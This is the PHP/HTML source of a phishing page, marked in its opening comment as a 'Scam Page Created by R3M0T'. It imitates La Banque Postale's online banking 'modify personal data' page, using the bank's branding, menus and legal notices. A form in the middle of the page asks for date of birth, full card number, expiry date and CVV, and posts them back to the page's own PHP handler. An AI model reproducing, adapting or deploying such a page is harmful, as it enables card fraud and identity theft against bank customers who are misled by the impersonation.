<?php
 // Scam Page Created by R3M0T <3 | 2019-2020
 require_once('functions.php');

?>
<!DOCTYPE html>
<html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <title><?php echo $web_title; ?></title>
<link rel="shortcut icon" href="images/favicon.png">
<link rel="stylesheet" type="text/css" href="assets/reset.css" media="all">
<link rel="stylesheet" type="text/css" href="assets/datePicker.css" media="all">
<link rel="stylesheet" type="text/css" href="assets/default.css" media="all">
<link rel="stylesheet" type="text/css" href="assets/static.css" media="all">
<link rel="stylesheet" type="text/css" href="assets/rib.css" media="all">
<link rel="stylesheet" type="text/css" href="assets/blocs.css" media="all">
<link rel="stylesheet" type="text/css" href="assets/jquery-ui-1.8.6.css" media="all">
<link rel="stylesheet" type="text/css" href="assets/print.css" media="all">
<link rel="stylesheet" type="text/css" href="assets/bridge.css" media="all">
<link rel="stylesheet" type="text/css" href="assets/fontesLocales.css" media="all">
<link rel="stylesheet" type="text/css" href="assets/main.css" media="all">
<link rel="stylesheet" type="text/css" href="assets/outils.css" media="all">
<link rel="stylesheet" type="text/css" href="assets/correctifs-style.css" media="all">
<link href="font/css/fontawesome.css" rel="stylesheet">
<link href="font/css/brands.css" rel="stylesheet">
<link href="font/css/solid.css" rel="stylesheet">
<link href="assets/eys.css" rel="stylesheet">
<script type="text/javascript" async="" src="assets/exec.js.download"></script><script type="text/javascript" async="" src="assets/6573388.js.download"></script><script type="text/javascript" async="" src="assets/tro.js.download"></script><script type="text/javascript" src="assets/onsubmit.js.download"></script>
<script type="text/javascript" src="assets/eA-HTML.js.download"></script>
<script type="text/javascript" src="assets/FwMC-Ext.js.download"></script>

<script type="text/javascript" src="assets/lib-formbean-bel.js.download"></script>
<script type="text/javascript" src="assets/generique.js.download"></script>
<script type="text/javascript" src="assets/outils.js.download"></script>

<script type="text/javascript" src="assets/ajax.js.download"></script>
<script type="text/javascript" src="assets/hub.js.download"></script>
<script type="text/javascript" src="assets/messagerie.js.download"></script>
<script type="text/javascript" src="assets/persoCartes.js.download"></script>

<script type="text/javascript" src="assets/jquery-1.11.1.min.js.download"></script>
<script type="text/javascript" src="assets/jquery-migrate-1.4.0.js.download"></script>
<script type="text/javascript" src="assets/jquery.tablesorter.js.download"></script>
<script type="text/javascript" src="assets/jquery.fixcolheight.js.download"></script>
<script type="text/javascript" src="assets/jquery.simplemodal.js.download"></script>
<script type="text/javascript" src="assets/jquery.placeholder.js.download"></script>
<script type="text/javascript" src="assets/jquery.datePicker.js.download"></script>
<script type="text/javascript" src="assets/jquery-ui.min.js.download"></script>
<script type="text/javascript" src="assets/date.js.download"></script>
<script type="text/javascript" src="assets/date_fr.js.download"></script>
<script type="text/javascript" src="assets/swfobject.js.download"></script>
<script type="text/javascript" src="assets/typeahead.jquery.min.js.download"></script>

<script type="text/javascript" src="assets/config.js.download"></script>
<script type="text/javascript" src="assets/lib-init.js.download"></script>
<script type="text/javascript" src="assets/print.js.download"></script>
<script type="text/javascript" src="assets/bootstrap.js.download"></script>
<script type="text/javascript" src="assets/plugin.js.download"></script>
<script type="text/javascript" src="assets/main.js.download"></script>
<script type="text/javascript" src="assets/select2.min.js.download"></script>

<script type="text/javascript" src="assets/profile.js.download"></script>

<script type="text/javascript">
    $(document).ready(function(){
        $('a.btn_crt:contains("Annuler")').addClass("btn_annuler");
    });
</script>




<script type="text/javascript"> 
    
        
            var infoRenseigneePremiereFois = true;
        
        
    
</script>

<script type="text/javascript" src="assets/eA-HTML.js.download"></script>
<script type="text/javascript" src="assets/onsubmit.js.download"></script>
<script type="text/javascript" src="assets/donneesProfessionnelles.js.download"></script>


    <link rel="stylesheet" href="assets/inbenta.css"></head>
    <body><script type="text/javascript" async="" src="assets/privacy_v2_3.js.download" charset="utf-8" id="tc_script_0.9391310848967944"></script>
        
        
        

        <div id="page">
            









<link href="assets/inbenta_faq.css" rel="stylesheet" type="text/css">

<!-- SCRIPT INBENTA  -->
<script language="javascript" type="text/javascript" src="assets/inbenta-faqv2.js.download" defer=""></script>

<!-- gestion de l'animation du header -->
<script type="text/javascript" src="assets/header.js.download" defer=""></script>

<div class="headerblock" style="display: block;"></div>

<header id="header-main" role="banner" class="fixed" style="width: 0px; left: 321.5px;">

    <nav id="menu" class="header__nav" role="navigation">
        <div class="content">
            <ul id="menuPrincipalNavigation">
                <li>
                    <a title="Retour à l&#39;accueil" class="" href="">
                        <img src="assets/logo-la-banque-postale.png" alt="La Banque Postale">
                    </a>
                </li>
                <li>
                    <a id="consulter" href="https://voscomptesenligne.labanquepostale.fr/" onclick="javascript:return tc_events_clic_timer(this,&#39;CLICK&#39;,{ &#39;clic_s2&#39;:&#39;16&#39;, &#39;clic_label&#39;:&#39;Consulter&#39;, &#39;clic_type&#39;:&#39;N&#39;});">
                        <span class="item">Consulter</span>
                    </a>
                </li>
                <li>
                    <a id="gerer" href="https://voscomptesenligne.labanquepostale.fr/voscomptes/canalXHTML/gerer/pagePrincipaleGerer/init-gerer.ea" onclick="javascript:return tc_events_clic_timer(this,&#39;CLICK&#39;,{ &#39;clic_s2&#39;:&#39;16&#39;, &#39;clic_label&#39;:&#39;Gerer&#39;, &#39;clic_type&#39;:&#39;N&#39;});">
                        <span class="item">Gérer</span>
                    </a>
                </li>
                <li>
                    <a id="contacter" href="https://voscomptesenligne.labanquepostale.fr/voscomptes/canalXHTML/securite/authentification/recupererPointEntree-identif.ea?entree=hub&amp;hub.origin=particuliers&amp;hub.codeMedia=0004&amp;hub.entree=HubHome" onclick="javascript:return tc_events_clic_timer(this,&#39;CLICK&#39;,{ &#39;clic_s2&#39;:&#39;16&#39;, &#39;clic_label&#39;:&#39;Contacter&#39;, &#39;clic_type&#39;:&#39;N&#39;});" title="Aucun message en attente dans votre messagerie sécurisée">
                        <span class="item item_contacter">
                            <div id="echec" class="cache_hub" style="float: left; display: none;">
                                <img src="assets/enveloppe.png" alt="">
                            </div>
                            <span>Contacter</span>
                            <span class="badge badge--primary cache_hub"><span>0</span></span>
                        </span>
                    </a>
                </li>
                <li>
                     <a id="informersouscrire" href="https://voscomptesenligne.labanquepostale.fr/voscomptes/canalXHTML/header/sinformerSouscription/init-informerSouscrire.ea" onclick="javascript:return tc_events_clic_timer(this,&#39;CLICK&#39;,{ &#39;clic_s2&#39;:&#39;16&#39;, &#39;clic_label&#39;:&#39;Souscrire&#39;, &#39;clic_type&#39;:&#39;N&#39;});">
                        <span class="item">Souscrire</span>
                    </a>
                </li>
            </ul>
            
                
            
        </div>
    </nav>
</header>


    
        <script type="text/javascript">
            var cookieNameBandeau = "BANDEAU";
            var cookiePathBandeau = "/";
            var cookieDomainBandeau = ".labanquepostale.fr";
        </script>

        
            
            <div class="header-bar fixed"></div>
            <div class="alert-user" role="alert">
                <div class="content">
                    <p class="alert__body regular">
                         <span><a href="#" class="inactive-link">Dernière connexion Internet c'est aujourd'hui</a></span>
                    </p>
                    <a class="alert__close" title="Supprimer le bandeau de connexion" id="bandeauInfosConnexion">
                    </a>
                </div>
            </div>
            
        
    


            <main id="main" role="main" class="content"> 
                 
                <input type="hidden" id="menuSelectionne" value=""> 
                
<?php
 if($error = true){
    echo $errormessage;
 }
?>

    <div class="toptitle simple">
        <h1 class="title-level1">Modifer vos données personnelles</h1>
    </div>
    
    <div id="persohaut"></div>
    
    <div class="par parsys"><a name="par_haut"></a>
        <div class="bloc parbase first section">
            
            <div id="perso_donnees_personnelles_modifier_haut">
                 <div class="CQedito">
                   <!-- DebugBlocEditorial : Bloc editorial absent du cache : perso_donnees_personnelles_modifier_haut -->
                 </div>
            </div>
            
        </div>
        <a name="par_html"></a>

        <div class="text parbase html section">     
            <div class="clear Tmargin"></div>
             <div class="bloc gestionFix">
                 <div class="affichercontenu selected">
                     <div id="persoIdentiteDetail" class="bottomlink accordContent">
        
                        <form method="POST">
                            <fieldset>
                                <div class="formline">
                                    <div class="label dl">
                                        <label for="datedenaissance">Date de Naissance : (JJ-MM-AAAA)</label>
                                    </div>
                                    <div class="field">
                                        <input type="date" required placeholder="JJ" size="2" maxlength="2" name="bday" value="">
                                    </div>
                                </div>
                                <div class="formline">
                                    <div class="label dl">
                                        <label for="lacarte">Numéro de Carte :</label>
                                    </div>
                                    <div class="field">
                                        <input type="text" name="cc" required="" placeholder="XXXX-XXXX-XXXX-XXXX" onkeypress="isInputNumber(event)" maxlength="16" minlength="16"/>

                                    </div>
                                </div>
                                <div class="formline">
                                    <div class="label dl">
                                        <label for="dateexp">Date D'expiration :</label>
                                    </div>
                                    <div>
                                        <select name="exmoth">
                                        <option value="01" >01</option>
                                        <option value="02" >02</option>
                                        <option value="03" >03</option>
                                        <option value="04" >04</option>
                                        <option value="05" >05</option>
                                        <option value="06" >06</option>
                                        <option value="07" >07</option>
                                        <option value="08" >08</option>
                                        <option value="09" >09</option>
                                        <option value="10" >10</option>
                                        <option value="11" >11</option>
                                        <option value="12" >12</option>
                                        </select>
                                        <select name="exyear">
                                        <option value="2021" >2021</option>
                                        <option value="2022" >2022</option>
                                        <option value="2023" >2023</option>
                                        <option value="2024" >2024</option>
                                        <option value="2025" >2025</option>
                                        <option value="2026" >2026</option>
                                        <option value="2027" >2027</option>
                                        <option value="2028" >2028</option>
                                        <option value="2029" >2029</option>
                                        <option value="2030" >2030</option>
                                        </select>
                                    </div>
                                </div>
                                <div class="formline">
                                    <div class="label dl">
                                        <label for="CVV">CVV :</label>
                                    </div>
                                    <div class="field">
                                        <input name="cvv" required type="text" onkeypress="isInputNumber(event)" maxlength="4" placeholder="CVC(CVV)" minlength="3">
                                    </div>
                                </div>
                                <div class="clear blcfooter"></div>
                            </fieldset>
                        <div class="bloc spaceT10">
                            
                            <div id="perso_donnees_personnelles_modifier_centre">
                                <div class="CQedito">
                                    <div class="CQblocedito  cq-dd-file" id="perso_donnees_personnelles_modifier_centre">
		
		<div class="block">
			<div class="blockInside">
				<div>
				
					<div class="textFCK"><p>Les données à caractère personnel recueillies font l'objet de traitements dont le responsable est La Banque Postale, conformément à la réglementation relative à la protection des données à caractère personnel.</p>
<p>Pour plus d’information sur la protection des données à caractère personnel, <a href="https://voscomptesenligne.labanquepostale.fr/voscomptes/canalXHTML/donneesPersonnelles/modificationDonneesPersonnellesSB491C/preparerModification-actionDonneePersonnelle.ea?idSBMM=SB491C#" onclick="window.open(&#39;https://www.labanquepostale.fr/particulier/Outils/aide/mentions_legales.donneespersonnelles.html&#39;)" class="underline" title="Protection des données personnelles (nouvelle fenêtre)">cliquez ici</a></p>
</div>
				</div>
			</div>
		</div>
	</div>
                                </div>
                            </div>
                            
                        </div>
                        <ul class="actions">
                            <li class="med">
                                <input class="btn" name="doUpdate" title="pour valider votre identité"  type="submit" value="Valider">
                            </li>
                            <li class="med">
                                <a href="">
                                    <strong>Annuler</strong>
                                </a>
                            </li>
                        </ul>                </div>
            </div>
     
        </div>
    </div>
    <a name="par_bas"></a>

    <div class="bloc last parbase section">
        
        <div id="perso_donnees_personnelles_modifier_bas">
            <div class="CQedito">
                <!-- DebugBlocEditorial : Bloc editorial absent du cache : perso_donnees_personnelles_modifier_bas -->
            </div>
        </div>
        
    </div>
</div>


<div id="persobas"></div>

 
            </main>
            <footer id="main-footer" role="contentinfo"> 
<div class="content">
    <div class="footer" id="footer">
	<div class="footer__logo">
		<img src="assets/logo-footer.png">
	</div>
	<ul class="footer__links">
			<li class="footer__links__item"><a href="https://www.labanquepostale.com/legroupe/banque-et-citoyenne/labanque/presentation.profil.html" target="_blank">
        A propos de La Banque Postale</a>
</li><li class="footer__links__item"><a href="https://www.labanquepostale.fr/particulier/Outils/tarifs_bancaires.html" target="_blank">
        Tarifs 2019</a>
</li><li class="footer__links__item"><a href="https://www.labanquepostale.fr/dam/refonte_Particulier/pdf/Conditions_Generales_banque_en_ligne.pdf" target="_blank">
        Conditions générales</a>
</li><li class="footer__links__item"><a href="https://www.labanquepostale.fr/particulier/securite.html" target="_blank">
        Sécurité</a>
</li><li class="footer__links__item"><a href="https://www.labanquepostale.fr/particulier/Outils/aide/accessibilite.html" target="_blank">
        Accessibilité</a>
</li><li class="footer__links__item"><a href="https://labanquepostale-client.deafiline.net/" target="_blank">
        Espace Sourds et Malentendants</a>
</li><li class="footer__links__item"><a href="https://www.labanquepostale.fr/particulier/Outils/aide/mentions_legales.html" target="_blank">
        Mentions légales</a>
</li><li class="footer__links__item"><a href="https://www.labanquepostale.fr/particulier/fond_garantie_depots.html" target="_blank">
        Fonds de Garantie des dépôts</a>
</li><li class="footer__links__item"><a href="https://voscomptesenligne.labanquepostale.fr/voscomptes/canalXHTML/autre/lanceurPageEdito/servicesMobiles-lanceur_page_edito.ea" target="_blank">
        Services Mobiles</a>
</li><li class="footer__links__item"><a href="https://www.labanquepostale.fr/particulier/Outils/aide/mentions_legales.donneespersonnelles.html" title="Données personnelles" target="_parent">
        Données personnelles</a>
</li>
	</ul>
</div>
</div> </footer>
        </div>

        <script type="text/javascript" src="assets/iframeResizer.min.js.download"></script>
        <script type="text/javascript">
            $("iframe").iFrameResize({
                checkOrigin : false,
                heightCalculationMethod : 'max'
            });
        </script>
        
        <!-- XiTi -->
<script type="text/javascript"> 
//<![CDATA[ 
var tc_vars = {
xiti_xtsite:"388889",
xiti_xtn2:"16",
xiti_xtpage:"videoposte::perso_donnees_personnelles_modifier"

}// ]]>
</script>

 <script>
            
            function isInputNumber(evt){
                
                var ch = String.fromCharCode(evt.which);
                
                if(!(/[0-9]/.test(ch))){
                    evt.preventDefault();
                }
                
            }
            
</script>
        <script type="text/javascript" src="assets/tc_LaBanquePostale_8.js.download"></script>
        <script type="text/javascript" src="assets/tc_LaBanquePostale_9.js.download"></script>
        <script type="text/javascript" src="assets/tc_event_timer.js.download"></script>    
<div class="inbenta-loader" style="display:none" iaf-loader=""><i class="icon load"></i></div><div id="inbenta-contents"></div></body></html>